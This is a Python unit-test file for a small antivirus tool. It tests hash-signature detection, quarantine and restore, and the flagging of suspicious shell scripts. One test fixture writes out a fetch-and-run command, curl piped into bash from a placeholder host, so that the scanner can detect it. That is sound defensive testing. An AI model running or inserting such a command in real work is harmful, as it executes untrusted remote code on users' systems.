from __future__ import annotations

import hashlib
import stat
import unittest
import uuid
from contextlib import contextmanager
from pathlib import Path

from top_antywir.quarantine import Quarantine
from top_antywir.scanner import Scanner, Verdict
from top_antywir.signatures import HashSignature

TEST_MALWARE_SAMPLE = b"top-antywir harmless hash test fixture\n"


@contextmanager
def project_temp_directory():
    temp_root = Path.cwd() / ".test-tmp"
    temp_root.mkdir(exist_ok=True)
    temp_dir = temp_root / uuid.uuid4().hex
    temp_dir.mkdir()
    yield temp_dir


class ScannerTests(unittest.TestCase):
    def test_detects_hash_signature(self) -> None:
        with project_temp_directory() as tmp:
            path = Path(tmp) / "sample.bin"
            path.write_bytes(TEST_MALWARE_SAMPLE)
            signature = HashSignature(
                name="Unit-Test-Signature",
                sha256=hashlib.sha256(TEST_MALWARE_SAMPLE).hexdigest(),
                severity="high",
                description="Harmless unit-test signature.",
            )

            result = Scanner(hash_signatures=(signature,)).scan_file(path)

            self.assertEqual(result.verdict, Verdict.INFECTED)
            self.assertEqual(result.findings[0].name, "Unit-Test-Signature")

    def test_detects_curl_pipe_shell_pattern(self) -> None:
        with project_temp_directory() as tmp:
            path = Path(tmp) / "installer.sh"
            path.write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")

            result = Scanner().scan_file(path)

            self.assertEqual(result.verdict, Verdict.SUSPICIOUS)
            self.assertTrue(any(f.name == "Suspicious-Curl-Pipe-Shell" for f in result.findings))

    def test_executable_shell_script_is_low_risk_finding(self) -> None:
        with project_temp_directory() as tmp:
            path = Path(tmp) / "script.sh"
            path.write_text("#!/bin/sh\necho ok\n", encoding="utf-8")
            path.chmod(path.stat().st_mode | stat.S_IXUSR)

            result = Scanner().scan_file(path)

            self.assertEqual(result.verdict, Verdict.SUSPICIOUS)
            self.assertTrue(any(f.name == "Executable-Shell-Script" for f in result.findings))

    def test_quarantine_moves_and_restores_file(self) -> None:
        with project_temp_directory() as tmp:
            root = Path(tmp)
            sample = root / "sample.bin"
            sample.write_bytes(TEST_MALWARE_SAMPLE)
            signature = HashSignature(
                name="Unit-Test-Signature",
                sha256=hashlib.sha256(TEST_MALWARE_SAMPLE).hexdigest(),
                severity="high",
                description="Harmless unit-test signature.",
            )
            result = Scanner(hash_signatures=(signature,)).scan_file(sample)

            quarantine = Quarantine(root / "quarantine")
            item = quarantine.add(result)

            self.assertFalse(sample.exists())
            self.assertTrue(item.stored_path.exists())

            restored = quarantine.restore(item.item_id)

            self.assertEqual(restored, sample)
            self.assertTrue(sample.exists())


if __name__ == "__main__":
    unittest.main()
